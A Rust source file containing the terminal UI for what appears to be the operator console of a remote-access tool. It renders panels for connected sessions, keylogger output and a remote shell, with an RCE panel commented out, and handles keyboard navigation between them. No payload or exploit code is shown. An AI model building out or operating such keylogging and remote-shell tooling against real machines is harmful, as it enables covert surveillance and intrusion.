pub mod keylogger;
//pub mod rce;
pub mod session;
pub mod shell;

use crossterm::event::{KeyCode, KeyEvent, KeyModifiers};
use ratatui::{
    layout::{Constraint, Direction, Layout, Margin, Rect},
    style::{Color, Style, Stylize},
    text::{Line, Span, Text},
    widgets::{Block, BorderType, Paragraph},
    Frame,
};
use shell::ShellCmdHistory;

use crate::{
    app::{AppResult, SessionsMap},
    grpc::{RemoteShellServiceClient, SessionServiceClient},
};

#[derive(Debug, PartialEq)]
pub enum FocusedSection {
    Sessions,
    KeyLogger,
    Shell,
    Rce,
}

#[derive(Debug)]
pub struct Sections {
    pub focused_section: FocusedSection,
    pub shell_section: shell::ShellSection,
    pub keylogger_section: keylogger::KeyLoggerSection,
    pub session_section: session::SessionSection,
    pub shell_percentage_split: Option<u16>,
}

impl Sections {
    pub fn new(app_shell: ShellCmdHistory, sessions: SessionsMap) -> Self {
        Self {
            focused_section: FocusedSection::Sessions,
            shell_section: shell::ShellSection::new(app_shell),
            keylogger_section: keylogger::KeyLoggerSection::new(),
            session_section: session::SessionSection::new(sessions),
            shell_percentage_split: None,
        }
    }

    fn render_footer_help(&self, frame: &mut Frame, block: Rect) {
        let message = {
            let mut base_message = vec![Span::from("󰘶 +  ").bold(), Span::from(" Nav")];
            if self.shell_percentage_split.is_some() {
                base_message.extend([
                    Span::from(" | "),
                    Span::from("Ctrl + ").bold(),
                    Span::from(" Resize shell"),
                ])
            }
            match self.focused_section {
                FocusedSection::Sessions => {
                    base_message.extend([
                        Span::from(" | "),
                        Span::from("s:").bold(),
                        Span::from(" (De)Activate Shell"),
                    ]);
                }
                _ => {}
            };
            base_message
        };

        let help = Text::from(vec![Line::from(message)]).blue().centered();

        frame.render_widget(
            Paragraph::new(help).centered().block(
                Block::bordered()
                    .border_type(BorderType::Rounded)
                    .border_style(Style::new().fg(Color::Blue)),
            ),
            block,
        );
    }

    pub fn render(&mut self, frame: &mut Frame) {
        let (main_block, help_block) = {
            let chunks = Layout::default()
                .direction(Direction::Vertical)
                .constraints([Constraint::Fill(1), Constraint::Length(3)])
                .flex(ratatui::layout::Flex::SpaceBetween)
                .split(frame.area());

            (chunks[0], chunks[1])
        };
        let (sessions_block, main_block) = {
            let chunks = Layout::default()
                .direction(Direction::Horizontal)
                .constraints([Constraint::Length(18), Constraint::Fill(1)])
                .flex(ratatui::layout::Flex::SpaceBetween)
                .split(main_block);
            (chunks[0], chunks[1])
        };

        self.session_section.render(
            frame,
            sessions_block,
            self.focused_section == FocusedSection::Sessions,
        );

        self.render_footer_help(frame, help_block);

        let (keylogger_block, shell_block) = {
            match self.shell_percentage_split {
                Some(k) => {
                    let chunks = Layout::default()
                        .direction(Direction::Vertical)
                        .constraints([Constraint::Fill(1), Constraint::Percentage(k)])
                        .flex(ratatui::layout::Flex::SpaceBetween)
                        .split(main_block);
                    (chunks[0], Some(chunks[1]))
                }
                None => {
                    let chunks = Layout::default()
                        .direction(Direction::Vertical)
                        .constraints([Constraint::Fill(1)])
                        .flex(ratatui::layout::Flex::SpaceBetween)
                        .split(main_block);
                    (chunks[0], None)
                }
            }
        };
        self.keylogger_section.render(
            frame,
            keylogger_block,
            &mut self.session_section.selected_session,
            self.focused_section == FocusedSection::KeyLogger,
        );
        if let Some(shell_block) = shell_block {
            self.shell_section.render(
                frame,
                shell_block.inner(Margin {
                    horizontal: 1,
                    vertical: 0,
                }),
                self.focused_section == FocusedSection::Shell,
            );
        }
    }

    pub async fn handle_keys(
        &mut self,
        key_event: KeyEvent,
        shell_client: &mut RemoteShellServiceClient,
        _session_client: &mut SessionServiceClient,
    ) -> AppResult<()> {
        if key_event.modifiers.contains(KeyModifiers::CONTROL) {
            if let Some(k) = self.shell_percentage_split {
                match key_event.code {
                    KeyCode::Char('j') | KeyCode::Down => {
                        self.shell_percentage_split = Some(k.saturating_sub(5).max(20));
                        // decrease by 5%
                    }
                    KeyCode::Char('k') | KeyCode::Up => {
                        Some(self.shell_percentage_split = Some((k + 5).min(90)));
                        // increase by 5%
                    }
                    _ => {}
                }
            }
        } else if key_event.modifiers.contains(KeyModifiers::SHIFT) {
            match key_event.code {
                KeyCode::Char('j') | KeyCode::Down => match self.focused_section {
                    FocusedSection::KeyLogger => {
                        if let Some(_) = self.shell_percentage_split {
                            self.focused_section = FocusedSection::Shell
                        }
                    }
                    _ => {}
                },
                KeyCode::Char('k') | KeyCode::Up => match self.focused_section {
                    FocusedSection::Shell => {
                        if let Some(_) = self.shell_percentage_split {
                            self.focused_section = FocusedSection::KeyLogger
                        }
                    }
                    _ => {}
                },
                KeyCode::Char('h') | KeyCode::Left => match self.focused_section {
                    FocusedSection::KeyLogger | FocusedSection::Shell => {
                        self.focused_section = FocusedSection::Sessions
                    }
                    _ => {}
                },
                KeyCode::Char('l') | KeyCode::Right => match self.focused_section {
                    FocusedSection::Sessions => self.focused_section = FocusedSection::KeyLogger,
                    _ => {}
                },
                _ => {}
            }
        } else {
            match self.focused_section {
                FocusedSection::Sessions => match key_event.code {
                    KeyCode::Enter => {}
                    KeyCode::Char('j') | KeyCode::Down => self.session_section.next_row(),
                    KeyCode::Char('k') | KeyCode::Up => self.session_section.previous_row(),
                    KeyCode::Char('s') => {
                        self.shell_percentage_split = if let Some(_) = self.shell_percentage_split {
                            None
                        } else {
                            Some(20)
                        };
                    }
                    _ => {}
                },
                FocusedSection::Shell => {
                    self.shell_section
                        .handle_keys(key_event, shell_client)
                        .await?;
                }

                _ => {}
            }
        }

        Ok(())
    }
}
